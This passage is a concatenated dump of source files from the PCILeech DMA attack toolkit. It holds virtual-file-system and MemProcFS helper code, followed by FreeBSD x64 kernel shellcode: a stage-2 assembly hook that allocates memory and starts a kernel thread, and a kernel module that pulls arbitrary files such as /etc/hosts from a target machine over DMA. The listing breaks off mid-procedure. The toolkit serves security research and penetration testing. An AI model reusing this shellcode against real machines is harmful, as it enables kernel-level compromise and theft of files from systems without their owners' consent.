                    memcpy(pVfsEntry, pDir->pFilesU + i, sizeof(VFS_ENTRY));
                    Ob_DECREF(pObDir);
                    return TRUE;
                }
            }
            pDir = pDir->FLink;
        }
        Ob_DECREF(pObDir);
    }
    return FALSE;
}

/*
* Clear cached directory entries and/or files.
* -- uszPath = the directory path to clear including/excluding file name.
*/
VOID VfsList_Clear(_In_ LPSTR uszPath)
{
    CHAR uszPathSplit[3 * MAX_PATH] = { 0 };
    CharUtil_PathSplitLastEx(uszPath, uszPathSplit, _countof(uszPathSplit));
    Ob_DECREF(ObCacheMap_RemoveByKey(g_ctxVfsList.pcm, CharUtil_HashPathFsU(uszPath)));
    Ob_DECREF(ObCacheMap_RemoveByKey(g_ctxVfsList.pcm, CharUtil_HashPathFsU(uszPathSplit)));
}

#ifdef _WIN32

_Success_(return)
BOOL VfsList_EntryUtoW(_In_ PVFS_ENTRY peVfs, _Out_ PWIN32_FIND_DATAW pFindData)
{
    pFindData->dwFileAttributes = peVfs->dwFileAttributes;
    pFindData->ftCreationTime = peVfs->ftCreationTime;
    pFindData->ftLastAccessTime = peVfs->ftLastAccessTime;
    pFindData->ftLastWriteTime = peVfs->ftLastWriteTime;
    pFindData->nFileSizeHigh = (DWORD)(peVfs->cbFileSize >> 32);
    pFindData->nFileSizeLow = (DWORD)(peVfs->cbFileSize);
    CharUtil_UtoW(peVfs->uszName, -1, (PBYTE)pFindData->cFileName, sizeof(pFindData->cFileName), NULL, NULL, CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR | CHARUTIL_FLAG_STR_BUFONLY);
    return TRUE;
}

/*
* Retrieve information about a single entry inside a directory (Windows WCHAR version).
* -- wszPath
* -- wszFile
* -- pFindData
* -- pfPathValid = receives if wszPath is valid or not.
* -- return
*/
_Success_(return)
BOOL VfsList_GetSingleW(_In_ LPWSTR wszPath, _In_ LPWSTR wszFile, _Out_ PWIN32_FIND_DATAW pFindData, _Out_ PBOOL pfPathValid)
{
    VFS_ENTRY eVfs;
    LPSTR uszPath, uszFile;
    BYTE pbBuffer1[2 * MAX_PATH], pbBuffer2[MAX_PATH];
    if(!CharUtil_WtoU(wszPath, -1, pbBuffer1, sizeof(pbBuffer1), &uszPath, NULL, 0)) { return FALSE; }
    if(!CharUtil_WtoU(wszFile, -1, pbBuffer2, sizeof(pbBuffer2), &uszFile, NULL, 0)) { return FALSE; }
    if(!VfsList_GetSingle(uszPath, uszFile, &eVfs, pfPathValid)) { return FALSE; }
    return VfsList_EntryUtoW(&eVfs, pFindData);
}

/*
* List a directory using a callback function (Windows WCHAR version).
* -- wszPath
* -- ctx = optional context to pass along to callback function.
* -- pfnListCallback = callback function called one time per directory entry.
* -- return = TRUE if directory exists, otherwise FALSE.
*/
BOOL VfsList_ListDirectoryW(_In_ LPWSTR wszPath, _In_opt_ PVOID ctx, _In_opt_ PFN_VFSLISTW_CALLBACK pfnListCallback)
{
    DWORD i;
    PVFSLIST_DIRECTORY pDir;
    PVFSLISTOB_DIRECTORY pObDir;
    WIN32_FIND_DATAW eFindData = { 0 };
    LPSTR uszPath;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU(wszPath, -1, pbBuffer, sizeof(pbBuffer), &uszPath, NULL, 0)) { return FALSE; }
    if(!(pObDir = VfsList_GetDirectory(uszPath))) { return FALSE; }
    if(pfnListCallback) {
        pDir = &pObDir->Dir;
        while(pDir) {
            for(i = 0; i < pDir->cFiles; i++) {
                VfsList_EntryUtoW(pDir->pFilesU + i, &eFindData);
                pfnListCallback(&eFindData, ctx);
            }
            pDir = pDir->FLink;
        }
    }
    Ob_DECREF(pObDir);
    return TRUE;
}

#endif /* _WIN32 */

/*
* Evaluate whether a given cachemap entry is still valid time wise.
* -- qwContext
* -- qwKey
* -- pvObject
* -- return
*/
BOOL VfsList_ValidEntry(_Inout_ PQWORD qwContext, _In_ QWORD qwKey, _In_ PVFSLISTOB_DIRECTORY pvObject)
{
    UNREFERENCED_PARAMETER(qwContext);
    UNREFERENCED_PARAMETER(qwKey);
    return pvObject->tc64 + g_ctxVfsList.qwCacheValidMs > GetTickCount64();
}

/*
* Close and clean up the vfs list functionality.
*/
void VfsList_Close()
{
    Ob_DECREF(g_ctxVfsList.pcm);
    if(g_ctxVfsList.fSingleThread) {
        DeleteCriticalSection(&g_ctxVfsList.Lock);
    }
    ZeroMemory(&g_ctxVfsList, sizeof(VFSLIST_CONTEXT));
}

/*
* Initialize the vfs list functionality.
* -- pfnVfsListU
* -- dwCacheValidMs
* -- cCacheMaxEntries
* -- fSingleThread = pfnVfsListU is single-threaded
* -- return
*/
_Success_(return)
BOOL VfsList_Initialize(_In_ VFS_LIST_U_PFN pfnVfsListU, _In_ DWORD dwCacheValidMs, _In_ DWORD cCacheMaxEntries, _In_ BOOL fSingleThread)
{
    g_ctxVfsList.pcm = ObCacheMap_New(
        cCacheMaxEntries,
        (BOOL(*)(PQWORD, QWORD, PVOID))VfsList_ValidEntry,
        OB_CACHEMAP_FLAGS_OBJECT_OB
    );
    if(!g_ctxVfsList.pcm) { return FALSE; }
    g_ctxVfsList.qwCacheValidMs = dwCacheValidMs;
    g_ctxVfsList.pfnVfsListU = pfnVfsListU;
    if(fSingleThread) {
        InitializeCriticalSection(&g_ctxVfsList.Lock);
        g_ctxVfsList.fSingleThread = TRUE;
    }
#ifdef _WIN32
    SYSTEMTIME SystemTimeNow;
    GetSystemTime(&SystemTimeNow);
    SystemTimeToFileTime(&SystemTimeNow, &g_ctxVfsList.ftDefaultTime);
#else
    g_ctxVfsList.ftDefaultTime = (time(NULL) * 10000000) + 116444736000000000;
#endif /* _WIN32 */
    return TRUE;
}

```

`pcileech/vfslist.h`:

```h
// vfslist.h : definitions related to virtual file system support.
//
// (c) Ulf Frisk, 2018-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __VFSLIST_H__
#define __VFSLIST_H__

#ifdef _WIN32
#include <Windows.h>
typedef unsigned __int64                QWORD, *PQWORD;
#else
#include "oscompatibility.h"
#endif /* _WIN32 */
#include <vmmdll.h>

typedef struct tdVFS_ENTRY {
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    QWORD cbFileSize;
    DWORD dwFileAttributes;
    BOOL fDirectory;
    CHAR uszName[2 * MAX_PATH];
} VFS_ENTRY, *PVFS_ENTRY;

typedef void(*PFN_VFSLIST_CALLBACK)(_In_ PVFS_ENTRY pVfsEntry, _In_opt_ PVOID ctx);

/*
* Clear cached directory entries and/or files.
* -- uszPath = the directory path to clear including/excluding file name.
*/
VOID VfsList_Clear(_In_ LPSTR uszPath);

/*
* Retrieve information about a single entry inside a directory.
* -- uszPath
* -- uszFile
* -- pVfsEntry
* -- pfPathValid = receives if wszPath is valid or not.
* -- return
*/
_Success_(return)
BOOL VfsList_GetSingle(_In_ LPSTR uszPath, _In_ LPSTR uszFile, _Out_ PVFS_ENTRY pVfsEntry, _Out_ PBOOL pfPathValid);

/*
* List a directory using a callback function
* -- uszPath
* -- ctx = optional context to pass along to callback function.
* -- pfnListCallback = callback function called one time per directory entry.
* -- return = TRUE if directory exists, otherwise FALSE.
*/
BOOL VfsList_ListDirectory(_In_ LPSTR uszPath, _In_opt_ PVOID ctx, _In_opt_ PFN_VFSLIST_CALLBACK pfnListCallback);

#ifdef _WIN32

typedef int(__stdcall *PFN_VFSLISTW_CALLBACK)(_In_ PWIN32_FIND_DATAW pFindData, _In_opt_ PVOID ctx);

/*
* Retrieve information about a single entry inside a directory (Windows WCHAR version).
* -- wszPath
* -- wszFile
* -- pFindData
* -- pfPathValid = receives if wszPath is valid or not.
* -- return
*/
_Success_(return)
BOOL VfsList_GetSingleW(_In_ LPWSTR wszPath, _In_ LPWSTR wszFile, _Out_ PWIN32_FIND_DATAW pFindData, _Out_ PBOOL pfPathValid);

/*
* List a directory using a callback function (Windows WCHAR version).
* -- wszPath
* -- ctx = optional context to pass along to callback function.
* -- pfnListCallback = callback function called one time per directory entry.
* -- return = TRUE if directory exists, otherwise FALSE.
*/
BOOL VfsList_ListDirectoryW(_In_ LPWSTR wszPath, _In_opt_ PVOID ctx, _In_opt_ PFN_VFSLISTW_CALLBACK pfnListCallback);

#endif /* _WIN32 */

/*
* typedef for VMMDLL_VfsListU function or any functions that may override it.
*/
typedef BOOL(*VFS_LIST_U_PFN)(_In_ LPSTR  uszPath, _Inout_ PVMMDLL_VFS_FILELIST2 pFileList);

/*
* Initialize the vfs list functionality.
* -- pfnVfsListU
* -- dwCacheValidMs
* -- cCacheMaxEntries
* -- fSingleThread = pfnVfsListU is single-threaded
* -- return
*/
_Success_(return)
BOOL VfsList_Initialize(_In_ VFS_LIST_U_PFN pfnVfsListU, _In_ DWORD dwCacheValidMs, _In_ DWORD cCacheMaxEntries, _In_ BOOL fSingleThread);

/*
* Close and clean up the vfs list functionality.
*/
VOID VfsList_Close();

#endif /* __VFSLIST_H__ */

```

`pcileech/vmmx.c`:

```c
// vmmx.h : implementation of external memory process file system functionality.
//
// (c) Ulf Frisk, 2020-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <stdio.h>
#include <vmmdll.h>
#include "vmmx.h"
#include "pcileech.h"

/*
* Close an open MemProcFS instance.
*/
VOID Vmmx_Close()
{
    VMMDLL_Close();
    ctxMain->fVmmInitialized = FALSE;
}

/*
* Load the memory process file system mode using the default LeechCore device.
* The memory process file system is initialized in either updating mode if the
* fRefresh flag is set and the LeechCore memory is volatile; otherwise it's
* started in non-updating mode.
* -- fRefresh
* -- fMemMapAuto
* -- return
*/
_Success_(return)
BOOL Vmmx_Initialize(_In_ BOOL fRefresh,  _In_ BOOL fMemMapAuto)
{
    DWORD cParams = 3;
    LPSTR szParams[] = { "", "-device", "existing", "", "", "" };

    if(!ctxMain->fVmmInitialized) {
        if(fRefresh) {
            szParams[cParams++] = "-norefresh";
        }
        if(fMemMapAuto) {
            szParams[cParams++] = "-memmap";
            szParams[cParams++] = "auto";
        }
        ctxMain->fVmmInitialized = VMMDLL_Initialize(cParams, szParams);
        if(!ctxMain->fVmmInitialized) {
            printf("MemProcFS: Failed to initialize memory process file system in call to vmm.dll!VMMDLL_Initialize\n");
        }
    }
    return ctxMain->fVmmInitialized;
}

```

`pcileech/vmmx.h`:

```h
// vmmx.h : definitions related to external memory process file system functionality.
//
// (c) Ulf Frisk, 2020-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __VMMX_H__
#define __VMMX_H__
#include <vmmdll.h>
#include "pcileech.h"
#include "oscompatibility.h"

/*
* Load the memory process file system mode using the default LeechCore device.
* The memory process file system is initialized in either updating mode if the
* fRefresh flag is set and the LeechCore memory is volatile; otherwise it's
* started in non-updating mode.
* -- fRefresh
* -- fMemMapAuto
* -- return
*/
_Success_(return)
BOOL Vmmx_Initialize(_In_ BOOL fRefresh, _In_ BOOL fMemMapAuto);

/*
* Close an open MemProcFS instance.
*/
VOID Vmmx_Close();

#endif /* __VMMX_H__ */

```

`pcileech_shellcode/fbsdx64_common.c`:

```c
// fbsdx64_common.c : support functions used by FreeBSD KMDs started by stage3 EXEC.
// Compatible with FreeBSD x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//

#include "fbsdx64_common.h"

```

`pcileech_shellcode/fbsdx64_common.h`:

```h
// fbsdx64_common.h : declarations of commonly used shellcode functions
// Compatible with FreeBSD x64.
//
// Author: Ulf Frisk, pcileech@frizk.net
//

#ifndef __FBSDX64_COMMON_H__
#define __FBSDX64_COMMON_H__

#include "statuscodes.h"

typedef void					VOID, *PVOID;
typedef int						BOOL, *PBOOL;
typedef unsigned char			BYTE, *PBYTE;
typedef char					CHAR, *PCHAR;
typedef unsigned short			WORD, *PWORD;
typedef unsigned long			DWORD, *PDWORD;
typedef unsigned __int64		QWORD, *PQWORD;
typedef void					*HANDLE;
typedef unsigned long			STATUS;
#define NULL					((void *)0)
#define MAX_PATH				260
#define TRUE					1
#define FALSE					0

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD[8];			// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[13];	// [0x098] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
	QWORD dataOut[28];				// [0x220]
	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
	CHAR ReservedFutureUse2[252];
	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
	CHAR ReservedFutureUse3[252];
	QWORD ReservedFutureUse4[255];	// [0x800]
	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

extern QWORD SysVCall(QWORD fn, ...);
extern QWORD LookupFunctionFreeBSD(PKMDDATA pk, CHAR szFunctionName[]);
extern QWORD __curthread();
#define curthread		(__curthread())

#endif /* __FBSDX64_COMMON_H__ */
```

`pcileech_shellcode/fbsdx64_common_a.asm`:

```asm
; fbsdx64_common_a.asm : assembly to receive execution from stage3 exec command.
; Compatible with FreeBSD x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

; -------------------------------------
; Prototypes
; -------------------------------------
main PROTO
LookupFunctionFreeBSD PROTO
SysVCall PROTO
EXTRN c_EntryPoint:NEAR

; -------------------------------------
; Code
; -------------------------------------
.CODE

main PROC
	PUSH rsi
	MOV rsi, rsp
	AND rsp, 0FFFFFFFFFFFFFFF0h
	SUB rsp, 020h
	CALL c_EntryPoint
	MOV rsp, rsi
	POP rsi
	RET
main ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN BSD KERNEL
; destroyed registers :: rsi
; rcx -> PKMDDATA
; rdx -> rdi -> ptr to symbol/function str
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionFreeBSD PROC
	PUSH rdi
	PUSH rsi
	MOV rdi, rdx
	MOV rcx, [rcx+58h]			; [PKMDDATA->ReservedKMD]
	MOV rdx, rcx				; [PKMDDATA->ReservedKMD]
	SUB rcx, 8
	loop_symsearch:
	SUB rcx, 18h
	MOV rax, [rcx]
	TEST rax, rax
	JZ error
	MOV esi, [rcx]
	ADD rsi, rdx
	CALL strcmp_simple
	TEST rax, rax
	JNZ loop_symsearch
	MOV rax, [rcx+8]
	POP rsi
	POP rdi
	RET
	error:
	XOR rax, rax
	POP rsi
	POP rdi
	RET
LookupFunctionFreeBSD ENDP

; ------------------------------------------------------------------
; Convert from the Windows X64 calling convention to the SystemV
; X64 calling convention used by Linux. A maximum of twelve (12)
; parameters in addition to the function ptr can be supplied.
; QWORD SysVCall(QWORD fn, QWORD p1, QWORD p2, QWORD p3, QWORD p4, QWORD p5);
; QWORD SysVCall(QWORD fn, ...);
; ------------------------------------------------------------------
SysVCall PROC
	MOV rax, rcx
	PUSH rdi
	PUSH rsi
	PUSH r14
	PUSH r15
	MOV rdi, rdx
	MOV rsi, r8
	MOV rdx, r9
	MOV rcx, [rsp+28h+4*8+00h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	MOV r8,  [rsp+28h+4*8+08h]
	MOV r9,  [rsp+28h+4*8+10h]
	MOV r15, rsp
	MOV r14, [rsp+28h+4*8+40h] ; 20h stack shadow space + 8h (RET) + 3*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+5*8+38h] ; 20h stack shadow space + 8h (RET) + 4*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+6*8+30h] ; 20h stack shadow space + 8h (RET) + 5*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+7*8+28h] ; 20h stack shadow space + 8h (RET) + 6*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+8*8+20h] ; 20h stack shadow space + 8h (RET) + 7*8h PUSH + xxh offset
	PUSH r14
	MOV r14, [rsp+28h+9*8+18h] ; 20h stack shadow space + 8h (RET) + 8*8h PUSH + xxh offset
	PUSH r14
	CALL rax
	MOV rsp, r15
	POP r15
	POP r14
	POP rsi
	POP rdi
	RET
SysVCall ENDP

__curthread PROC
	MOV rax, gs:[0]
	RET
__curthread ENDP

END
```

`pcileech_shellcode/fbsdx64_filepull.c`:

```c
// fbsdx64_filepull.c : kernel code to pull files from target system.
// Compatible with FreeBSD x64.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel fbsdx64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel fbsdx64_filepull.c
// ml64 fbsdx64_common_a.asm /Felx64_filepull.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main fbsdx64_filepull.obj fbsdx64_common.obj
// shellcode64.exe -o fbsdx64_filepull.exe "PULL FILES FROM TARGET SYSTEM                                  \nFreeBSD x64 EDITION                                            \n===============================================================\nPull a file from the target system to the local system.        \nREQUIRED OPTIONS:                                              \n  -out : file on local system to write result to.              \n         filename is given in normal format.                   \n         Example: '-out c:\temp\hosts'                         \n  -s : file on target system.                                  \n         Example: '-s /etc/hosts'                              \n===== PULL ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
// 

#include "fbsdx64_common.h"

#define LOOKUP				0 
#define FOLLOW				0x0040
#define AT_FDCWD			-100
#define FREAD				0x0001
#define FWRITE				0x0002
#define NDF_NO_FREE_PNBUF	0x00000020
#define NDF_ONLY_PNBUF		(~NDF_NO_FREE_PNBUF)
#define IO_NODELOCKED		0x0008

enum uio_seg {
	UIO_USERSPACE,
	UIO_SYSSPACE,
	UIO_NOCOPY
};

enum uio_rw {
	UIO_READ,
	UIO_WRITE
};

struct vattr {
	QWORD _opaque1[4];
	QWORD va_size;
	QWORD _opaque2[32];
};

struct vop_getattr_args {
	QWORD a_gen_a_desc;
	QWORD a_vp;
	QWORD a_vattr;
	QWORD a_cred;
};

struct vop_unlock_args {
	QWORD a_gen_a_desc;
	QWORD a_vp;
	QWORD a_flags;
};

struct nameidata {
	QWORD _opaque1[12];
	QWORD vnode;
	QWORD _opaque2[32];
};

typedef struct tdFN2 {
	QWORD NDINIT_ALL;
	QWORD NDFREE;
	QWORD VOP_GETATTR_APV;
	QWORD VOP_UNLOCK_APV;
	QWORD memcpy;
	QWORD vn_close;
	QWORD vn_open;
	QWORD vn_rdwr;
	QWORD vop_getattr_desc;
	QWORD vop_unlock_desc;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { 'N', 'D', 'I', 'N', 'I', 'T', '_', 'A', 'L', 'L', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'N', 'D', 'F', 'R', 'E', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'V', 'O', 'P', '_', 'G', 'E', 'T', 'A', 'T', 'T', 'R', '_', 'A', 'P', 'V', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'V', 'O', 'P', '_', 'U', 'N', 'L', 'O', 'C', 'K', '_', 'A', 'P', 'V', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'm', 'e', 'm', 'c', 'p', 'y', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'n', '_', 'r', 'd', 'w', 'r', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'o', 'p', '_', 'g', 'e', 't', 'a', 't', 't', 'r', '_', 'd', 'e', 's', 'c', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { 'v', 'o', 'p', '_', 'u', 'n', 'l', 'o', 'c', 'k', '_', 'd', 'e', 's', 'c', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionFreeBSD(pk, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

QWORD GetFileSize(PFN2 pfn2, QWORD vnode)
{
	struct vop_getattr_args a;
	struct vattr vattr;
	a.a_gen_a_desc = pfn2->vop_getattr_desc;
	a.a_vp = vnode;
	a.a_vattr = (QWORD)&vattr;
	a.a_cred = 0;
	if(SysVCall(pfn2->VOP_GETATTR_APV, *(PQWORD)(vnode + 0x08) /* v_op is 2nd entry in vnode */, &a)) {
		return 0;
	}
	return vattr.va_size;
}

VOID VOP_UNLOCK(PFN2 pfn2, QWORD vnode, QWORD flags)
{
	struct vop_unlock_args a;
	a.a_gen_a_desc = pfn2->vop_unlock_desc;
	a.a_vp = vnode;
	a.a_flags = flags;
	SysVCall(pfn2->VOP_UNLOCK_APV, *(PQWORD)(vnode + 0x08) /* v_op is 2nd entry in vnode */, &a);
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	struct nameidata nd;
	QWORD flags, fsize, error;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(fn2.NDINIT_ALL, &nd, LOOKUP, FOLLOW, UIO_SYSSPACE, pk->dataInStr, AT_FDCWD, 0, 0, curthread);
	flags = FREAD;
	if(SysVCall(fn2.vn_open, &nd, &flags, 0, 0)) {
		SysVCall(fn2.NDFREE, &nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_CANNOT_OPEN;
		return;
	}
	fsize = GetFileSize(&fn2, nd.vnode);
	if(fsize == 0 || fsize > pk->dataOutExtraLengthMax) {
		SysVCall(fn2.NDFREE, nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_SIZE;
		return;
	}
	error = SysVCall(fn2.vn_rdwr, UIO_READ, nd.vnode, (pk->DMAAddrVirtual + pk->dataOutExtraOffset), fsize, 0, UIO_SYSSPACE, IO_NODELOCKED, 0, 0, 0, curthread);
	if(error) {
		SysVCall(fn2.NDFREE, &nd, NDF_ONLY_PNBUF);
		pk->dataOut[0] = STATUS_FAIL_FILE_READWRITE;
		return;
	}
	pk->dataOutExtraLength = fsize;
	VOP_UNLOCK(&fn2, nd.vnode, 0);
	SysVCall(fn2.vn_close, nd.vnode, FREAD, 0, curthread);
	SysVCall(fn2.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
}

```

`pcileech_shellcode/fbsdx64_stage2.asm`:

```asm
; fbsdx64_stage2.asm : assembly to receive execution from stage1 shellcode.
; Compatible with FreeBSD x64.
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, pcileech@frizk.net
;

.CODE

main PROC
	; ----------------------------------------------------
	; 1: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_cmpxchg_flag					db 00h
	data_filler							db 00h
	data_phys_addr_alloc				dd 00000000h						; 4 bytes offset (4 bytes long)
	data_orig_code						dq 0000000000000000h				; 8 bytes offset (8 bytes long)
	data_offset_strtab					dd 00000000h						; 16 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 2: SAVE ORIGINAL PARAMETERS
	; ----------------------------------------------------
	main_start:
	POP rax
	SUB rax, 5
	PUSH rax
	PUSH rdi
	PUSH rsi
	PUSH rdx
	PUSH rcx
	PUSH r8
	PUSH r9
	PUSH r12
	PUSH r13
	PUSH r14
	; ----------------------------------------------------
	; 3: RESTORE ORIGNAL (8 bytes)
	; ----------------------------------------------------
	MOV rdx, [data_orig_code]
	MOV [rax], rdx
	; ----------------------------------------------------
	; 4: ENSURE ATOMICITY IN THREADED ENVIRONMENTS
	; ----------------------------------------------------
	MOV al, 00h
	MOV dl, 01h
	LEA rcx, data_cmpxchg_flag
	LOCK CMPXCHG [rcx], dl
	JNE skipcall
	; ----------------------------------------------------
	; 5: SET UP PARAMETERS AND CALL C CODE
	;    r12: tmp 1 (virt addr)
	;    r13: tmp 2 (phys addr)
	;    r14: addr to strtab
	; ----------------------------------------------------
	MOV eax, [data_offset_strtab]
	LEA r14, main
	ADD r14, rax
	CALL setup
	; ----------------------------------------------------
	; 6: RESTORE AND JMP BACK
	; ----------------------------------------------------
	skipcall:
	POP r14
	POP r13
	POP r12
	POP r9
	POP r8
	POP rcx
	POP rdx
	POP rsi
	POP rdi
	RET
main ENDP

setup PROC
	; ----------------------------------------------------
	; 1: ALLOCATE 2 PAGES OF CONTIGUOUS MEMORY
	; ----------------------------------------------------
	LEA rdi, data_str_vm_phys_alloc_contig
	CALL LookupFunctionBSD
	XOR r8, r8						; border = 0
	MOV ecx, 1000h					; alignment
	MOV edx, 80000000h				; max phys addr
	XOR rsi, rsi					; min phys addr = 0
	MOV edi, 2						; 2 pages
	CALL rax
	MOV r13, [rax+8*6]				; vm_page_t -> phys addr
	; ----------------------------------------------------
	; 2: VIRT ADDR = FFFFF80000000000 + PHYS ADDR
	; ----------------------------------------------------
	MOV r12, 0FFFFF80000000000h
	ADD r12, r13
	; ----------------------------------------------------
	; 3: ZERO MEMORY AND COPY INITIAL LOOP
	; ----------------------------------------------------
	MOV rdi, r12
	CALL clear_8k
	MOV rax, 048FFFFFFF1058D48h
	MOV [r12+1000h], rax
	MOV rax, 0F07400F88348008Bh
	MOV [r12+1008h], rax
	; ----------------------------------------------------
	; 4: START KERNEL THREAD
	; ----------------------------------------------------
	LEA rdi, data_str_kthread_start
	CALL LookupFunctionBSD
	PUSH 0
	MOV edi, 1000h
	ADD rdi, r12
	PUSH rdi
	LEA rdi, data_str_pcileech
	PUSH rdi
	MOV rdi, rsp
	CALL rax
	POP rax
	POP rax
	POP rax
	; ----------------------------------------------------
	; 5: WRITE BACK PHYSICAL ADDRESS
	; ----------------------------------------------------
	MOV [r12+58h], r14					; Addr StrTab -> KMDDATA.ReservedKMD
	MOV [data_phys_addr_alloc], r13d
	MOV [data_filler], 66h				; DEBUG
	RET
setup ENDP

; ----------------------------------------------------
; FIND EXPORTED SYMBOL IN BSD KERNEL
; destroyed registers :: rsi
; rdi -> ptr to symbol str
; rax <- resulting address (zero if error)
; ----------------------------------------------------
LookupFunctionBSD PROC
	MOV rcx, r14
	SUB rcx, 8
	loop_symsearch:
	SUB rcx, 18h
	MOV rax, [rcx]
	TEST rax, rax
	JZ error
	MOV esi, [rcx]
	ADD rsi, r14
	CALL strcmp_simple
	TEST rax, rax
	JNZ loop_symsearch
	MOV rax, [rcx+8]
	RET
	error:
	XOR rax, rax
	RET
LookupFunctionBSD ENDP

; ----------------------------------------------------
; TRIVIAL VERSION OF STRCMP
; destroyed registers :: <none>
; rdi -> ptr to str1
; rsi -> ptr to str2
; rax <- 0 == success, !0 == fail
; ----------------------------------------------------
strcmp_simple PROC
	PUSH rcx
	XOR rcx, rcx
	DEC rcx
	loop_strcmp:
	INC rcx
	MOV al, [rdi+rcx]
	CMP al, [rsi+rcx]
	JNE error
	CMP al, 0
	JNE loop_strcmp
	XOR rax, rax
	POP rcx
	RET
	error:
	MOV al, 1
	POP rcx
	RET
strcmp_simple ENDP

; ----------------------------------------------------
; CLEAR 8K OF MEMORY
; destroyed registers :: rcx
; rdi -> starting address
; ----------------------------------------------------
clear_8k PROC
